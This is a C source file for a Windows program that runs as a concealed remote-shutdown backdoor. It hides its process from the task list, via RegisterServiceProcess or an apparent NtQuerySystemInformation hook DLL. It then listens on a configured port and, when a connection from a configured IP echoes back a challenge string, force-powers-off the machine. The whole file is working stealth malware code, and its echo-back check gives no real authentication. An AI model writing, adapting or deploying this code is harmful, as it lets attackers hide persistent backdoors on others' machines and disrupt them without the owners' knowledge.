#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <windows.h>
#include <winsock.h>

typedef DWORD (WINAPI *REGSERVICEPROC)(DWORD dwProcessId, DWORD dwServiceType);

static REGSERVICEPROC RegisterServiceProcess;

static char random_data[1024], *random_p;
static char recv_buf[1024];

static char config_port[] = "Shutdown-Port: xxxxx";
static char config_ip[] = "Server-IP: xxx.xxx.xxx.xxx";

static void send_all(int fd, void *data, int len)
{
  int ret;
  while(len > 0)
  {
    ret = send(fd, data, len, 0);
    if(ret < 0)
      return;
    len -= ret;
  }
}

static void setnonblocking(int s)
{
  u_long opts = 1;
  ioctlsocket(s, FIONBIO, &opts);
}

static int get_port()
{
  char *p = config_port;
  while(*p!=' ') p++;
  return atoi(p+1);
}

static char *get_ip()
{
  char *p = config_ip;
  while(*p!=' ') p++;
  return p+1;
}

static void add_ulong(unsigned long num)
{
  sprintf(random_p, "%x", num);
  while(*random_p) random_p++;
}

static void add_data(void *data, unsigned int len)
{
  unsigned int i;
  unsigned char *p = (unsigned char *)data;
  for(i = 0; i < len; i++)
  {
    if(isprint(*p))
    {
      *random_p = *p;
      random_p++;
    } else {
      add_ulong(*p);
    }
    p++;
  }
}

static void gather_random()
{
  random_data[0] = 0;
  random_p = random_data;
  add_ulong((unsigned long)GetActiveWindow());
  add_ulong((unsigned long)GetCapture());
  add_ulong((unsigned long)GetClipboardOwner());
  add_ulong((unsigned long)GetClipboardViewer());
  add_ulong((unsigned long)GetCurrentProcess());
  add_ulong((unsigned long)GetCurrentProcessId());
  add_ulong((unsigned long)GetCurrentThread());
  add_ulong((unsigned long)GetCurrentThreadId());
  add_ulong((unsigned long)GetDesktopWindow());
  add_ulong((unsigned long)GetFocus());
  add_ulong((unsigned long)GetInputState());
  add_ulong((unsigned long)GetMessagePos());
  add_ulong((unsigned long)GetMessageTime());
  add_ulong((unsigned long)GetOpenClipboardWindow());
  add_ulong((unsigned long)GetProcessHeap());
  add_ulong((unsigned long)GetProcessWindowStation());
  add_ulong((unsigned long)GetQueueStatus(QS_ALLEVENTS));
  add_ulong((unsigned long)GetTickCount());
  {
    POINT point;
    GetCaretPos(&point);
    add_data(&point, sizeof (point));
	  GetCursorPos(&point);
	  add_data(&point, sizeof (point));
  }
  {
    MEMORYSTATUS memoryStatus;
    memoryStatus.dwLength = sizeof(MEMORYSTATUS);
    GlobalMemoryStatus(&memoryStatus);
    add_data(&memoryStatus, sizeof(memoryStatus));
  }
}

int main()
{
  
  WSADATA wsaData;
  struct sockaddr_in server_address;
  int sock, port = get_port();
  char *ip = get_ip();
  HINSTANCE Kernel32 = LoadLibrary("KERNEL32.DLL");
  OSVERSIONINFO osvi;

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osvi);
  
  if(osvi.dwPlatformId == VER_PLATFORM_WIN32_NT)
  {
    int (_cdecl *pfnHook)(DWORD);
		HINSTANCE HookNTQSI= LoadLibrary("HookNTQSI.dll");
		if(HookNTQSI)
		{
			pfnHook = (int(*)(DWORD))GetProcAddress(HookNTQSI,"Hook");
			pfnHook(GetCurrentProcessId());
		}
  } else {
    RegisterServiceProcess = (REGSERVICEPROC)GetProcAddress(Kernel32, "RegisterServiceProcess");
    RegisterServiceProcess(0, 1);
  }
  
  WSAStartup(MAKEWORD(1, 1), &wsaData);
  sock = socket(AF_INET, SOCK_STREAM, 0);
  
  memset((char *)&server_address, 0, sizeof(server_address));
  server_address.sin_family = AF_INET;
  server_address.sin_addr.s_addr = htonl(INADDR_ANY);
  server_address.sin_port = htons(port);
  
  while(bind(sock, (struct sockaddr *) &server_address, sizeof(server_address)) < 0)
    Sleep(1000);
  
  listen(sock, 1);
  
  for(;;)
  {
    
    fd_set rfds;
    struct timeval tv;
    struct sockaddr_in addr;
    int connection, retval;
    int len = sizeof(addr);
    
    connection = accept(sock, (struct sockaddr *) &addr, &len);
    setnonblocking(connection);
    
    if(strcmp(inet_ntoa(addr.sin_addr), ip))
    {
      close(connection);
      continue;
    }
    
    gather_random();
    send_all(connection, random_data, strlen(random_data));
    
    FD_ZERO(&rfds);
    FD_SET(connection, &rfds);

    tv.tv_sec = 3;
    tv.tv_usec = 0;
    
    retval = select(1, &rfds, 0, 0, &tv);
    
    if(retval == 1)
    {
      recv(connection, recv_buf, strlen(random_data), 0);
      if(!strcmp(recv_buf, random_data))
        ExitWindowsEx(EWX_SHUTDOWN | EWX_POWEROFF | EWX_FORCE, 0x00050013);
    }
    
    close(connection);
    
  }
  
  return 0;
  
}
